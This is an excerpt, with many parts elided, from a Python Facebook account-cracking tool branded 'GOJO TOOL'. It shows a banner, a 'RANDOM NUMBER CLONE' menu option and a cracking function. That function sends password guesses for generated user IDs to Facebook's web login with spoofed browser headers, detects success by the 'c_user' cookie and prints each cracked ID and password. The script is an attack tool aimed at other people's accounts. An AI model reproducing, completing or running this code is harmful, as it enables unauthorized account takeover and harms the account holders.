...
os.system('xdg-open https://github.com/SF-AXN')
...
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░  
      ...
      \x1b[37;41m\t WELLCOME TO GOJO TOOL\x1b[0;m\n\n\x1b[1;37m                          
\33[1;37m----------------------------------------------
→   Owner      : GS GOJO SATURO
→   Facebook   :  GOJO SATURO
→   Github     :  GOJO 150
→   Tool Type  :  premium active
\x1b[1;97m→   Version    :  0.1.1
\33[1;37m----------------------------------------------
""")                                              
...
class Main:
    ...
    def __init__(self):
        ...
        print(" [01] RANDOM  NUMBER CLONE \033[1;34m[ULTRA WORKING Tested By ASIF]")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
  		  ...
  		  'dpr': '2.625',
 		   'referer': 'https://web.alpha.facebook.com/?refsrc=deprecated&paipv=0&eav=AfbwBSqlJhYy4wpkpQe41KlDOIun4ReckbSVxstjWJcwGSs5OgiZ6jMAc6fctwEwDeQ&_rdc=1&_rdr',
  		  'sec-ch-prefers-color-scheme': 'light',
   		 'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
 		   'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="124.0.6270.219", "Google Chrome";v="124.0.6270.219"',
 		   'sec-ch-ua-mobile': '?0',
  		  'sec-ch-ua-model': '"SM-A505F"',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[GS-OK💉] {uid} | {ps}")
        ...
        sys.stdout.write(f'\r\033[m[GS🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
